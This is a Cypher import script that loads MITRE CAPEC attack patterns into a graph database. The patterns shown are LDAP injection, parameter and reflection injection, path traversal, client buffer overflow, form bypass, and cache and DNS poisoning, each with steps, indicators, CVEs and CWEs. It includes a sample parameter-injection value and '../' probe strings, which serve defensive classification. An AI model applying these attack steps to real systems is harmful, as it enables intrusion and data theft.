CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives an error message from target indicating a problem with the LDAP Query</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least user controllable data input to application identified."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No inputs susceptible to injection into the application were identified.."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Try to exploit the LDAP injection vulnerability", description: "<div level=\"0\">\n  <p class=\"text\">After determining that a given input is vulnerable to LDAP Injection, hypothesize what the underlying query looks like. Possibly using a tool, iteratively try to add logic to the query to extract information from the LDAP, or to modify or delete information in the LDAP.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Add logic to the LDAP query to change the meaning of that command. Automated tools could be used to generate the LDAP injection strings.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives normal response from server.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Probing via LDAP syntax injection was successful in identifying vulnerable input.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Probing via LDAP syntax injection failed in identifying vulnerable input.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker achieves goal of unauthorized information access, etc."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Attacker unable to exploit LDAP Injection vulnerability."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:Reference{id: "REF-1", local_id: "R.136.1", title: "WASC Threat Classification 2.0", section: "WASC-29 - LDAP Injection", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/LDAP-Injection"});
MERGE (:CWE{id: 77});
MERGE (:CWE{id: 90});
MERGE (:CWE{id: 20});
CREATE (:AttackPattern{id: 137, name: "Parameter Injection", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 78, text: "<div level=\"0\">\n  <p class=\"text\">The target application must use a parameter encoding where separators and parameter identifiers are expressed in regular text.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 79, text: "<div level=\"0\">\n  <p class=\"text\">The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.</p>\n</div>"});
CREATE (:Submission{id: 113});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 78});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Motivation-Consequences, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 113, summary: "OrderedDict([('Text', 'An adversary exploits weaknesses in input validation by manipulating the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (&). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value \"myInput&new_param=myValue\", then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.')])"});
CREATE (:ResourcesRequired{id: 39, text: "<div level=\"0\">\n  <p class=\"text\">The ability to provide string input to the target.</p>\n</div>"});
CREATE (:AttackPattern{id: 138, name: "Reflection Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 80, text: "<div level=\"0\">\n  <p class=\"text\">The target application must utilize reflection libraries and allow users to directly control the parameters to these methods.</p>\n</div>"});
CREATE (:Submission{id: 114});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 114, summary: "OrderedDict([('Text', 'An attacker supplies a value to the target application which is then used by reflection methods to identify a class, method, or field. For example, in the Java programming language the reflection libraries permit an application to inspect, load, and invoke classes and their components by name. If an attacker can control the input into these methods including the name of the class/method/field or the parameters passed to methods, they can cause the targeted application to invoke incorrect methods, read random fields, or even to load and utilize malicious classes that the attacker created. This can lead to the application revealing sensitive information, returning incorrect results, or even having the attacker take control of the targeted application.')])"});
CREATE (:ResourcesRequired{id: 40, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for most forms of this attack beyond the ability to provide input to the target that is used to populate parameters for reflection methods. If the attacker can host classes where the target can invoke them, more powerful variants of this attack are possible.</p>\n</div>"});
CREATE (:AttackPattern{id: 139, name: "Relative Path Traversal", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 81, text: "<div level=\"0\">\n  <p class=\"text\">The target application must accept a string as user input, fail to sanitize combinations of characters in the input that have a special meaning in the context of path navigation, and insert the user-supplied string into path navigation commands.</p>\n</div>"});
CREATE (:Submission{id: 115});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 79});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 80});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 81});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Attack_Phases, Related_Weaknesses"});
CREATE (:Modification{id: 82});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Description{id: 115, summary: "OrderedDict([('Text', \"An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or \\\\) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey application", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds. He picks out the URL parameters that may related to access to files.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browser's plug-in are available to facilitate the analysis or automate the URL discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">There are links that include parameters in URL.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding parameters is created by the attacker."});
CREATE (:Outcome{id: 2, type: "Success", description: "A list of application user interface entry fields is created by the attacker."});
CREATE (:Outcome{id: 3, type: "Success", description: "A list of resources accessed by the application is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attempt variations on input parameters", description: "<div level=\"0\">\n  <p class=\"text\">Possibly using an automated tool, an attacker requests variations on the identified inputs. He sends parameters that include variations of payloads.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a list of probe strings as path traversal payload. Different strings may be used for different platforms. Strings contain relative path sequences such as \"../\".</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record results of manual input of relative path traversal probes in known URLs.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attackers can access arbitrary files.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The output of pages includes some error messages if file does not exist.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">All context-sensitive characters are consistently re-encoded before being sent to the web browser.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's file path probe string is being reflected verbatim at some point in the web site (if not on the same page)."});
CREATE (:Outcome{id: 2, type: "Success", description: "An error message or exception. Note that the system may leak information to the attackers in the error messages, e.g. \"File Not Found\", \"File Access Restricted\"."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Access, modify, or execute arbitrary files.", description: "<div level=\"0\">\n  <p class=\"text\">An attacker injects path traversal syntax into identified vulnerable inputs to cause inappropriate reading, writing or execution of files. An attacker could be able to read directories or files which they are normally not allowed to read. The attacker could also access data outside the web document root, or include scripts, source code and other kinds of files from external websites. Once the attacker accesses arbitrary files, he/she could also modify files. In particular situations, the attacker could also execute arbitrary code or system commands.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Manipulate file and its path by injecting relative path sequences (e.g. \"../\").</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Download files, modify files, or try to execute shell commands (with binary files).</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker accesses the content of restricted files."});
CREATE (:Outcome{id: 2, type: "Success", description: "Apply appropriate input validation to filter all user-controllable input of path syntax."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:Reference{id: "REF-5", local_id: "R.139.1", title: "The OWASP Application Security Desk Reference", section: "Path Traversal", publisher: "The Open Web Application Security Project (OWASP)", pubdate: "2009", link: "https://www.owasp.org/index.php/Path_Traversal"});
MERGE (:Reference{id: "REF-4", local_id: "R.139.2", title: "OWASP Testing Guide", section: "Testing for Path Traversal (OWASP-AZ-001)", publisher: "The Open Web Application Security Project (OWASP)", pubdate: "2010", link: "https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)"});
MERGE (:Reference{id: "REF-1", local_id: "R.139.3", title: "WASC Threat Classification 2.0", section: "WASC-33 - Path Traversal", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/w/page/13246952/Path-Traversal"});
CREATE (:CVE{id: "CVE-2010-0467", description: "<div level=\"0\">\n  <p class=\"text\">Newsletter module allows reading arbitrary files using \"../\" sequences.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2009-4581", description: "<div level=\"0\">\n  <p class=\"text\">PHP program allows arbitrary code execution using \"..\" in filenames that are fed to the include() function.</p>\n</div>"});
MERGE (:CWE{id: 23});
CREATE (:AttackPattern{id: 14, name: "Client-side Injection-induced Buffer Overflow", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 82, text: "<div level=\"0\">\n  <p class=\"text\">The targeted client software communicates with an external server.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 83, text: "<div level=\"0\">\n  <p class=\"text\">The targeted client software has a buffer overflow vulnerability.</p>\n</div>"});
CREATE (:Submission{id: 116});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 83});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 116, summary: "OrderedDict([('Text', 'This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker creates a custom hostile service</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker acquires information about the kind of client attaching to her hostile service to determine if it contains an exploitable buffer overflow vulnerability.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker intentionally feeds malicious data to the client to exploit the buffer overflow vulnerability that she has uncovered.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker leverages the exploit to execute arbitrary code or to cause a denial of service.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.14.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.14.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-119: Buffer Errors", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/119.html"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 353});
MERGE (:CWE{id: 118});
MERGE (:CWE{id: 119});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 680});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 713});
CREATE (:AttackPattern{id: 140, name: "Bypassing of Intermediate Forms in Multiple-Form Sets", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 84, text: "<div level=\"0\">\n  <p class=\"text\">The target must collect information from the user in a series of forms where each form has its own URL that the attacker can anticipate and the application must fail to detect attempts to access intermediate forms without first filling out the previous forms.</p>\n</div>"});
CREATE (:Submission{id: 117});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 117, summary: "OrderedDict([('Text', 'Some web applications require users to submit information through an ordered sequence of web forms. This is often done if there is a very large amount of information being collected or if information on earlier forms is used to pre-populate fields or determine which additional information the application needs to collect. An attacker who knows the names of the various forms in the sequence may be able to explicitly type in the name of a later form and navigate to it without first going through the previous forms. This can result in incomplete collection of information, incorrect assumptions about the information submitted by the attacker, or other problems that can impair the functioning of the application.')])"});
CREATE (:ResourcesRequired{id: 43, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 141, name: "Cache Poisoning", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 85, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to modify the value stored in a cache to match a desired value.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 86, text: "<div level=\"0\">\n  <p class=\"text\">The targeted application must not be able to detect the illicit modification of the cache and must trust the cache value in its calculations.</p>\n</div>"});
CREATE (:Submission{id: 118});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 84});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 85});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 118, summary: "OrderedDict([('Text', \"An attacker exploits the functionality of cache technologies to cause specific data to be cached that aids the attackers' objectives. This describes any attack whereby an attacker places incorrect or harmful material in cache. The targeted cache can be an application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache). Until the cache is refreshed, most applications or clients will treat the corrupted cache value as valid. This can lead to a wide range of exploits including redirecting web browsers towards sites that install malware and repeatedly incorrect calculations based on the incorrect value.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Identify and explore caches", description: "<div level=\"0\">\n  <p class=\"text\">Use tools to sniff traffic and scan a network in order to locate application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache) that may have vulnerabilities. Look for poisoning point in cache table entries.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Run tools that check available entries in the cache.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Entries do not exist in the cache.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Applications or servers are not updated to new versions.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Entries exist in the cache.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of server's information. No target entry found in the cache."});
CREATE (:Outcome{id: 2, type: "Success", description: "A list of browser's information. No target entry found in the cache."});
CREATE (:Outcome{id: 3, type: "Failure", description: "The results show target entries in the cache."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Cause specific data to be cached", description: "<div level=\"0\">\n  <p class=\"text\">An attacker sends bogus request to the target, and then floods responses that trick a cache to remember malicious responses, which are wrong answers of queries.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Request that the attacker intercepts includes transaction ID.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker successfully sends response before authorized server.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Transaction ID has been randomized.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The application or server cache has recorded correct table entry. In this case, the attacker needs to figure out a way to overwrite table entries to succeed</p>\n</div>"});
CREATE (:Indicator{id: 5, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker fails to send responses before authorized responses. In this case, the attacker needs to figure out a way to overwrite table entries to succeed</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Any request of the targeted form results in the seeded response."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Any request of the targeted form results in the correct response and not the seeded response."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Redirect users to malicious website", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, he is able to manipulate and interpose malicious response data to targeted victim queries.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Man-in-the-Middle intercepts secure communication between two parties.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Any request of the targeted form results in the seeded response."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Any request of the targeted form results in the correct response and not the seeded response."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
MERGE (:Reference{id: "REF-6", local_id: "R.141.1", title: "Wikipedia", section: "DNS Cache Poisoning", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/DNS_cache_poisoning"});
MERGE (:Reference{id: "REF-7", local_id: "R.141.2", title: "DNS Threats and DNS Weaknesses", section: "DNS Threats & Weaknesses of the Domain Name System", publisher: "DNSSEC", link: "http://www.dnssec.net/dns-threats.php"});
MERGE (:Reference{id: "REF-6", local_id: "R.141.3", title: "Wikipedia", section: "Arp Spoofing", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/ARP_spoofing"});
MERGE (:CWE{id: 348});
MERGE (:CWE{id: 345});
MERGE (:CWE{id: 349});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 441});
CREATE (:AttackPattern{id: 142, name: "DNS Cache Poisoning", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 87, text: "<div level=\"0\">\n  <p class=\"text\">A DNS cache must be vulnerable to some attack that allows the attacker to replace addresses in its lookup table.</p>\n  <p class=\"text\">Client applications must trust the corrupted cashed values and utilize them for their domain name resolutions.</p>\n</div>"});
CREATE (:Submission{id: 119});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 86});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 119, summary: "OrderedDict([('Text', \"A domain name server translates a domain name (such as www.example.com) into an IP address that Internet hosts use to contact Internet resources. An attacker modifies a public DNS cache to cause certain names to resolve to incorrect addresses that the attacker specifies. The result is that client applications that rely upon the targeted cache for domain name resolution will be directed not to the actual address of the specified domain name but to some other address. Attackers can use this to herd clients to sites that install malware on the victim's computer or to masquerade as part of a Pharming attack.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Explore resolver caches", description: "<div level=\"0\">\n  <p class=\"text\">Check DNS caches on local DNS server and client's browser with DNS cache enabled.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Run tools that check the resolver cache in the memory to see if it contains a target DNS entry.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Figure out if the client's browser has DNS cache enabled.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Found no entry in the resolver cache</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The results show target DNS entry in DNS server</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of DNS server information. No target entry found in the resolver cache."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The results show target DNS entry in DNS server."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attempt sending crafted records to DNS cache", description: "<div level=\"0\">\n  <p class=\"text\">A request is sent to the authoritative server for target website and wait for the iterative name resolver. An attacker sends bogus request to the DNS local server, and then floods responses that trick a DNS cache to remember malicious responses, which are wrong answers of DNS query.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker must know the transaction ID by intercepting a DNS query, or sending a bogus query with known transaction ID.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">If the transaction ID used to identify each query instance is randomized in some new DNS software, the attack must guess the transaction ID. Slow the response of the real DNS server by causing Denial-of-service. This gives attacker enough time to guess transaction</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Attacker crafts DNS response with the same transaction ID as in the request. The attacker sends out DNS responses before the authorized DNS server. This forces DNS local cache stores fake DNS response (wrong answer). The fake DNS responses usually include a malicious website's IP address.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">DNS request that the attacker intercepts includes transaction ID.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker successfully sends DNS response before authorized DNS server.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Transaction ID has been randomized.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The DNS server cache has recorded correct Name and IP address entry. In this case, the attacker needs to figure out a way to overwrite table entries to succeed</p>\n</div>"});
CREATE (:Indicator{id: 5, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker fails to send DNS response before authorized DNS server. In this case, the attacker needs to figure out a way to overwrite table entries to succeed</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Any local machine that types names of the good server is redirected to a malicious server."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Any local machine that types names of the good server is not redirected to a malicious server."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Redirect users to malicious website", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, the victim connects to a malicious site using a good web site's domain name.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Redirecting Web traffic to a site that looks enough like the original so as to not raise any suspicion.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Man-in-the-Middle intercepts secure communication between two parties.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Any local machine that types names of the good server is redirected to a malicious server."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker accepts the incoming SSL connection, decrypts it, reads all the traffic, and makes the same request via SSL to the original site."});
CREATE (:Outcome{id: 3, type: "Failure", description: "Any local machine that types names of the good server is not redirected to a malicious server."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
MERGE (:Reference{id: "REF-6", local_id: "R.142.1", title: "Wikipedia", section: "DNS Cache Poisoning", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/DNS_cache_poisoning"});
MERGE (:Reference{id: "REF-7", local_id: "R.142.2", title: "DNS Threats and DNS Weaknesses", section: "DNS Threats & Weaknesses of the Domain Name System", publisher: "DNSSEC", link: "http://www.dnssec.net/dns-threats.php"});
MERGE (:Reference{local_id: "R.142.3", title: "Vulnerability Note VU#800113", publisher: "US CERT", pubdate: "2008-07-08", link: "http://www.kb.cert.org/vuls/id/800113#pat"});
CREATE (:CVE{id: "CVE-2005-0877", description: "<div level=\"0\">\n  <p class=\"text\">Dnsmasq before 2.21 allows remote attackers to poison the DNS cache via answers to queries that were not made by Dnsmasq.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2004-1754", description: "<div level=\"0\">\n  <p class=\"text\">The DNS proxy (DNSd) for multiple Symantec Gateway Security products allows remote attackers to poison the DNS cache via a malicious DNS server query response that contains authoritative or additional records.</p>\n</div>"});
MERGE (:CWE{id: 348});
MERGE (:CWE{id: 345});
MERGE (:CWE{id: 349});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 441});
MERGE (:CWE{id: 350});
CREATE (:ResourcesRequired{id: 44, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have the resources to modify the targeted cache. In addition, in most cases the attacker will wish to host the sites to which users will be redirected, although in some cases redirecting to a third party site will accomplish the attackers' goals.</p>\n</div>"});
